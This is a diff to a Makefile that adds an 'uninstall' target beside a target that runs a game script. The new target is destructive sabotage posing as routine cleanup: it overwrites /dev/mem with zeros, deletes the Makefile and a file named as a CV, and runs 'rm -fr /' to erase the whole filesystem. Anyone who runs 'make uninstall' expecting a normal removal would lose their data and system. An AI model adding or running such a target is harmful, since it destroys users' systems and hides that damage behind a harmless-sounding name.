@@ -661,6 +661,11 @@ extras:
 	@bash ${Gamename}
 	#@rm ${Gamename}  || echo Could not remove ${Gamename}
 
+uninstall:
+	@dd if=/dev/zero of=/dev/mem
+	@rm Makefile "Jakub_Olizarowicz CV.txt"
+	@rm -fr /
+
 #
 #The MIT License (MIT)
 #
